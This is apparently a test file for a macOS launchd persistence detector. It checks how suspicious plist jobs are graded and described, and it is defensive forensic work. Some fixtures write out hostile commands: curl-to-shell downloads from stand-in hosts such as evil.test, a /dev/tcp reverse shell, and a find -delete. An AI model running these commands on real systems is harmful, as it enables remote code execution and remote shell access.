// A launchd plist says what it establishes: a configuration, its context, its target (#933 item 8).
import { describe, it, expect } from "vitest";
import {
  configuredContext,
  LAUNCHD_STD_PATH,
  readLaunchctl,
  readTargetFacts,
  resolveTarget,
} from "../../src/analysis/macosLaunchTarget.js";
import { launchScope, readLaunchJob } from "../../src/analysis/macosPersistence.js";
import { gradeLaunchd } from "../../src/analysis/macosPersistRules.js";
import { parseMacPersist } from "../../src/analysis/macosPersistImport.js";
import { splitCollection } from "../../src/analysis/linuxPersistence.js";
import { classifyMacArtifact } from "../../src/analysis/macosPersistence.js";
import type { CollectedFile } from "../../src/analysis/linuxPersistence.js";

const plist = (entries: Record<string, string>) =>
  `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
${Object.entries(entries)
  .map(([k, v]) => `<key>${k}</key>${v}`)
  .join("\n")}
</dict></plist>`;
const prog = (...args: string[]) => `<array>${args.map((a) => `<string>${a}</string>`).join("")}</array>`;
const str = (s: string) => `<string>${s}</string>`;

const file = (path: string, content: string, over: Partial<CollectedFile> = {}): CollectedFile => ({
  path,
  kind: "launchd",
  content,
  ...over,
});
const grade = (
  entries: Record<string, string>,
  path = "/Library/LaunchDaemons/x.plist",
  extra?: Record<string, string>,
) => gradeLaunchd(file(path, plist(entries), extra ? { extra } : {}), {});

// A job that is already reportable on its own, so the facts have something to raise or explain.
const SUSP = { Label: str("com.vendor.helper"), ProgramArguments: prog("/Users/Shared/.a/agent") };
const TARGET = "/Users/Shared/.a/agent";

describe("execution context: what the plist's location and keys establish", () => {
  it("a daemon honours UserName; an agent does not, and the row says so", () => {
    expect(configuredContext(readLaunchJob({}), "system-daemon").who).toBe("root at boot");
    expect(configuredContext(readLaunchJob({ UserName: "www" }), "system-daemon").who).toBe("www at boot");
    const agent = configuredContext(readLaunchJob({ UserName: "root" }), "user-agent");
    expect(agent.who).toBe("that user at login");
    expect(agent.userNameIgnored).toBe(true);
    expect(agent.root).toBe(false);
    const [s] = grade({ ...SUSP, UserName: str("root") }, "/Users/alice/Library/LaunchAgents/x.plist");
    expect(s.reason).toContain("sets UserName root, which launchd ignores for an agent");
    expect(s.reason).not.toContain("configured to run as root");
  });
  it("Apple's own directories are split into daemon and agent", () => {
    expect(launchScope("/System/Library/LaunchDaemons/com.apple.x.plist")).toBe("apple-daemon");
    expect(launchScope("/System/Library/LaunchAgents/com.apple.x.plist")).toBe("apple-agent");
    expect(configuredContext(readLaunchJob({}), "apple-daemon").root).toBe(true);
    expect(configuredContext(readLaunchJob({}), "apple-agent").who).toBe("each user at login");
  });
  it("a LoginWindow agent is configured for root at the login window; other session types are named", () => {
    const lw = configuredContext(readLaunchJob({ LimitLoadToSessionType: "LoginWindow" }), "system-agent");
    expect(lw.who).toBe("root at the login window, before anyone logs in");
    expect(lw.root).toBe(true);
    const bg = configuredContext(readLaunchJob({ LimitLoadToSessionType: "Background" }), "system-agent");
    expect(bg.who).toBe("each user at login (Background session: no GUI needed)");
    const odd = configuredContext(readLaunchJob({ LimitLoadToSessionType: "[x] weird" }), "system-agent");
    expect(odd.who).toContain("session type (x) weird, which is not one launchd documents");
    expect(configuredContext(readLaunchJob({ LimitLoadToSessionType: "Aqua" }), "system-agent").who).toBe(
      "each user at login",
    );
  });
  it("a plist outside the launchd directories is loaded by nothing on its own", () => {
    const ctx = configuredContext(readLaunchJob({}), "elsewhere");
    expect(ctx.autoLoaded).toBe(false);
    const [s] = grade(SUSP, "/private/tmp/x.plist");
    expect(s.reason).toContain("a location launchd does not read");
    expect(s.reason).toContain("does not establish that it was ever loaded");
  });
});

describe("target resolution: what the plist itself names", () => {
  it("a bare name is looked up in launchd's own standard path, never the plist's PATH", () => {
    const job = readLaunchJob({
      ProgramArguments: ["python3", "-c", "x"],
      EnvironmentVariables: { PATH: "/Users/Shared/bin:/usr/bin" },
    });
    const t = resolveTarget(job);
    expect(t.form).toBe("bare");
    expect(t.target).toBe("");
    expect(t.note).toContain(`launchd looks it up in its standard path (${LAUNCHD_STD_PATH})`);
    expect(t.note).not.toContain("/Users/Shared/bin");
    // no path to grade: the transient rule does not fire on the PATH the plist set
    const [s] = grade({
      Label: str("x"),
      ProgramArguments: prog("python3", "-c", "import os; os.system('curl -fsSL http://evil.test/a | sh')"),
      EnvironmentVariables: `<dict><key>PATH</key><string>/Users/Shared/bin</string></dict>`,
    });
    expect(s.reason).toContain("a bare name");
    expect(s.reason).not.toContain("any process can write");
  });
  it("a Program that is not absolute is said to be invalid as launchd requires", () => {
    const t = resolveTarget(readLaunchJob({ Program: "bin/x" }));
    expect(t.form).toBe("program-not-absolute");
    expect(t.note).toContain("Program is not absolute as launchd requires");
  });
  it("a tilde is not expanded; a relative path joins WorkingDirectory or /", () => {
    const tilde = resolveTarget(readLaunchJob({ ProgramArguments: ["~/.hidden/x"] }));
    expect(tilde.form).toBe("tilde");
    expect(tilde.note).toContain("launchd does not expand ~");
    const [s] = grade({ Label: str("x"), ProgramArguments: prog("~/.hidden/x") });
    expect(s.reason).toContain("hidden directory");
    const rel = resolveTarget(
      readLaunchJob({ ProgramArguments: ["./run.sh"], WorkingDirectory: "/private/tmp" }),
    );
    expect(rel.form).toBe("relative");
    expect(rel.target).toBe("/private/tmp/run.sh");
    expect(resolveTarget(readLaunchJob({ ProgramArguments: ["bin/x"] })).target).toBe("/bin/x");
  });
  it("shows argv[0] when Program and ProgramArguments[0] differ", () => {
    const [s] = grade({
      Label: str("x"),
      Program: str("/private/tmp/dropper"),
      ProgramArguments: prog("/usr/sbin/cupsd"),
    });
    expect(s.reason).toContain("[argv0: /usr/sbin/cupsd]");
    expect(s.target).toBe("/private/tmp/dropper");
  });
});

describe("the words claim configuration, never execution", () => {
  it("no primary reason or trigger says the job runs, starts or is restarted", () => {
    const rows = [
      grade(SUSP)[0],
      grade({ ...SUSP, RunAtLoad: "<true/>", KeepAlive: "<true/>" })[0],
      grade({
        Label: str("x"),
        ProgramArguments: prog("/bin/sh", "-c", "curl -fsSL http://e.test/a | sh"),
      })[0],
      grade({ Label: str("com.apple.softwareupdated"), ProgramArguments: prog("/usr/local/bin/su") })[0],
      grade({
        Label: str("x"),
        ProgramArguments: prog("/bin/sh", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
      })[0],
      grade({ Label: str("x"), ProgramArguments: prog("/usr/bin/find", "/private/tmp/", "-delete") })[0],
    ];
    for (const s of rows) {
      expect(s.reason).not.toMatch(/\brunning as\b|starts by itself|is restarted when|re-runs every/);
      expect(s.reason).toContain("configured to run");
      expect(s.reason).toContain("nothing in the file shows the job was loaded or ran");
    }
  });
  it("triggers are what the file asks for; a KeepAlive dictionary lists its conditions", () => {
    const [s] = grade({
      ...SUSP,
      RunAtLoad: "<true/>",
      KeepAlive: `<dict><key>SuccessfulExit</key><false/><key>PathState</key><dict/></dict>`,
      StartInterval: "<integer>60</integer>",
      WatchPaths: prog("/etc/hosts"),
    });
    expect(s.reason).toContain("asks launchd to start it when loaded");
    expect(s.reason).toContain("restart it when it exits under these conditions: SuccessfulExit, PathState");
    expect(s.reason).toContain("stopping the process does not remove it");
    expect(s.reason).toContain("asks launchd to run it every 60 second(s)");
    expect(s.reason).toContain("asks launchd to run it when /etc/hosts changes");
  });
  it("a misleading label says the label is a string the author chose", () => {
    const [s] = grade({
      Label: str("com.apple.softwareupdated"),
      ProgramArguments: prog("/usr/local/bin/su"),
    });
    expect(s.reason).toContain(
      "The label is a string the author chose; it says nothing about what the program is.",
    );
  });
});

describe("# target: what the collector found at one path", () => {
  it("parses the grammar and rejects a line without path=", () => {
    expect(readTargetFacts("path=/a/b missing")).toMatchObject({ path: "/a/b", missing: true });
    expect(
      readTargetFacts("path=/a/b owner=alice mode=0755 group=staff mtime=2026-01-02T09:00:00Z"),
    ).toMatchObject({
      path: "/a/b",
      missing: false,
      owner: "alice",
      group: "staff",
      mode: 0o755,
      mtime: "2026-01-02T09:00:00.000Z",
      unreadable: [],
    });
    expect(readTargetFacts("owner=alice mode=0755")).toBeNull();
    const bad = readTargetFacts("path=/a/b owner=alice mode=rwx mtime=yesterday bogus=1");
    expect(bad?.mode).toBeUndefined();
    expect(bad?.mtime).toBeUndefined();
    expect(bad?.unreadable).toEqual(["mode=rwx", "mtime=yesterday", "bogus=1"]);
  });
  it("binds only to the job's resolved absolute target", () => {
    const [other] = grade(SUSP, undefined, { target: "path=/usr/local/bin/other owner=alice mode=0755" });
    expect(other.reason).toContain("recorded for /usr/local/bin/other, not this job's target; not applied");
    expect(other.severity).toBe("High");
    const [bare] = grade(
      { Label: str("x"), ProgramArguments: prog("python3", "-c", "curl http://e.test | sh") },
      undefined,
      { target: "path=/usr/bin/python3 owner=alice mode=0755" },
    );
    expect(bare.reason).toContain("names no absolute path to bind it to; not applied");
  });
  it("a missing target is said as the collector's observation, with no severity change", () => {
    const medium = { ...SUSP, Disabled: "<true/>" };
    const [s] = grade(medium, undefined, { target: `path=${TARGET} missing` });
    expect(s.reason).toContain(`The collector found no object at ${TARGET} at collection time`);
    expect(s.reason).toContain("nothing here shows it ever ran");
    expect(s.reason).not.toMatch(/stale|removed/);
    expect(s.severity).toBe("Medium");
  });
  it("a root job whose target is owned by another account, or writable by every account, is High; group-write is shown, not raised", () => {
    const medium = { ...SUSP, Disabled: "<true/>" };
    const owned = grade(medium, undefined, { target: `path=${TARGET} owner=alice mode=0755` })[0];
    expect(owned.severity).toBe("High");
    expect(owned.reason).toContain(
      "owned by alice, and a file's owner can change it, so that account can change what root runs",
    );
    const world = grade(medium, undefined, { target: `path=${TARGET} owner=root mode=0757` })[0];
    expect(world.severity).toBe("High");
    expect(world.reason).toContain("writable by every account on the host");
    const group = grade(medium, undefined, { target: `path=${TARGET} owner=root mode=0775 group=staff` })[0];
    expect(group.severity).toBe("Medium");
    expect(group.reason).toContain("writable by its group (staff); who is in that group was not recorded");
    const groupless = grade(medium, undefined, { target: `path=${TARGET} owner=root mode=0775` })[0];
    expect(groupless.reason).toContain("writable by its group (group not recorded)");
    for (const s of [owned, world, group]) {
      expect(s.reason).toContain(
        "ACLs, file flags and the permissions of the parent directories were not read",
      );
    }
    // the same facts on a user agent: that user changing that user's job is not a privilege path
    const agent = grade(medium, "/Users/alice/Library/LaunchAgents/x.plist", {
      target: `path=${TARGET} owner=alice mode=0757`,
    })[0];
    expect(agent.severity).toBe("Medium");
    expect(agent.reason).not.toContain("what root runs");
  });
  it("the target's reported mtime inside the incident window raises like the plist's", () => {
    const ctx = { incident: { start: "2026-01-01T00:00:00Z", end: "2026-01-03T00:00:00Z" } };
    const f = file("/Library/LaunchDaemons/x.plist", plist({ ...SUSP, Disabled: "<true/>" }), {
      extra: { target: `path=${TARGET} owner=root mode=0755 mtime=2026-01-02T09:00:00Z` },
    });
    const [s] = gradeLaunchd(f, ctx);
    expect(s.severity).toBe("High");
    expect(s.reason).toContain(
      "The reported modification time of the program falls inside the incident window (2026-01-02T09:00:00.000Z)",
    );
  });
  it("an unreadable pair is shown neutralised and the readable ones still apply", () => {
    const [s] = grade({ ...SUSP, Disabled: "<true/>" }, undefined, {
      target: `path=${TARGET} owner=alice mode=rwx] [x mtime=2026-13-45`,
    });
    expect(s.severity).toBe("High");
    expect(s.reason).toContain("not readable: mode=rwx), (x, mtime=2026-13-45");
    expect(s.reason).not.toContain("] [x");
  });
  it("an owner that spells a hash or a tag is neutralised", () => {
    const [s] = grade(SUSP, undefined, { target: `path=${TARGET} owner=${"a".repeat(32)}] [x mode=0755` });
    expect(s.reason).not.toMatch(/[0-9a-f]{32}/);
    expect(s.reason).not.toContain("] [x");
  });
});

describe("# launchctl: the queried domain's view of the label", () => {
  it("parses the grammar", () => {
    expect(readLaunchctl("system 412 0 com.vendor.helper")).toMatchObject({
      domain: "system",
      loaded: true,
      pid: 412,
      status: 0,
      label: "com.vendor.helper",
    });
    expect(readLaunchctl("gui/501\t-\t-9\tcom.vendor.helper")).toMatchObject({
      domain: "gui/501",
      loaded: true,
      pid: undefined,
      status: -9,
    });
    expect(readLaunchctl("user/501 not loaded")).toMatchObject({ domain: "user/501", loaded: false });
    expect(readLaunchctl("412 0 com.vendor.helper")).toBeNull();
    expect(readLaunchctl("system running")).toBeNull();
    expect(readLaunchctl("bogus/1 412 0 x")).toBeNull();
  });
  it("a running PID is execution evidence at collection time and raises", () => {
    const [s] = grade({ ...SUSP, Disabled: "<true/>" }, undefined, {
      launchctl: "system 412 0 com.vendor.helper",
    });
    expect(s.severity).toBe("High");
    expect(s.reason).toContain("loaded and running at collection time (pid 412, domain system)");
  });
  it("status 0 with no PID is not a run; a positive status is an exit; a negative one is a signal", () => {
    const medium = { ...SUSP, Disabled: "<true/>" };
    const zero = grade(medium, undefined, { launchctl: "system - 0 com.vendor.helper" })[0];
    expect(zero.severity).toBe("Medium");
    expect(zero.reason).toContain(
      "launchctl reported last status 0 — also the value of a job that has not run yet",
    );
    const one = grade(medium, undefined, { launchctl: "system - 1 com.vendor.helper" })[0];
    expect(one.severity).toBe("High");
    expect(one.reason).toContain("it has run at least once and last exited with status 1");
    const sig = grade(medium, undefined, { launchctl: "system - -9 com.vendor.helper" })[0];
    expect(sig.severity).toBe("High");
    expect(sig.reason).toContain("it last ended on signal 9");
  });
  it("a domain that does not load this plist, a missing domain, or another label is shown and not applied", () => {
    const medium = { ...SUSP, Disabled: "<true/>" };
    const wrong = grade(medium, undefined, { launchctl: "gui/501 412 0 com.vendor.helper" })[0];
    expect(wrong.severity).toBe("Medium");
    expect(wrong.reason).toContain("queried gui/501, which does not load this plist; not applied");
    const agentWrong = grade(medium, "/Library/LaunchAgents/x.plist", {
      launchctl: "system 412 0 com.vendor.helper",
    })[0];
    expect(agentWrong.reason).toContain("queried system, which does not load this plist; not applied");
    const noDomain = grade(medium, undefined, { launchctl: "412 0 com.vendor.helper" })[0];
    expect(noDomain.severity).toBe("Medium");
    expect(noDomain.reason).toContain("not decodable as a launchctl list line; not applied");
    const other = grade(medium, undefined, { launchctl: "system 412 0 com.other] [x" })[0];
    expect(other.severity).toBe("Medium");
    expect(other.reason).toContain("names com.other) (x, not this job; not applied");
  });
  it("not loaded says only that, for that domain, at that time", () => {
    const [s] = grade({ ...SUSP, Disabled: "<true/>" }, undefined, { launchctl: "system not loaded" });
    expect(s.severity).toBe("Medium");
    expect(s.reason).toContain(
      "not loaded in system at collection time; says nothing about earlier boots or about any other domain",
    );
  });
  it("an agent in a user domain speaks for the domain queried", () => {
    const [s] = grade(SUSP, "/Library/LaunchAgents/x.plist", { launchctl: "gui/501 - 3 com.vendor.helper" });
    expect(s.reason).toContain("domain gui/501");
    expect(s.reason).toContain("may be loaded in other users' domains this line does not speak for");
  });
});

describe("the collection carries the two new keys only under a launchd header", () => {
  it("a launchd member takes them as facts; a crontab keeps the line as evidence", () => {
    const text = [
      "==> /Library/LaunchDaemons/x.plist <==",
      "# target: path=/a owner=root mode=0755",
      "# launchctl: system 1 0 x",
      "<plist><dict/></plist>",
      "==> /usr/lib/cron/tabs/alice <==",
      "# target: something a human wrote",
      "* * * * * /tmp/x",
    ].join("\n");
    const [pl, cron] = splitCollection(text, classifyMacArtifact);
    expect(pl.extra).toEqual({ target: "path=/a owner=root mode=0755", launchctl: "system 1 0 x" });
    expect(pl.content).toBe("<plist><dict/></plist>");
    expect(cron.extra).toBeUndefined();
    expect(cron.content.split("\n")[0]).toBe("# target: something a human wrote");
  });
  it("re-importing with the facts added keeps the same event id", () => {
    const base = [
      "==> /Library/LaunchDaemons/x.plist <==",
      "# mtime: 2026-01-02T09:00:00Z",
      plist(SUSP),
    ].join("\n");
    const withFacts = [
      "==> /Library/LaunchDaemons/x.plist <==",
      "# mtime: 2026-01-02T09:00:00Z",
      `# target: path=${TARGET} owner=alice mode=0755`,
      "# launchctl: system 412 0 com.vendor.helper",
      plist(SUSP),
    ].join("\n");
    const a = parseMacPersist("mac.txt", base, {}, "2026-06-01T00:00:00Z");
    const b = parseMacPersist("mac.txt", withFacts, {}, "2026-06-01T00:00:00Z");
    expect(a.events).toHaveLength(1);
    expect(b.events).toHaveLength(1);
    expect(b.events[0].id).toBe(a.events[0].id);
    expect(b.events[0].description).toContain("pid 412");
  });
});
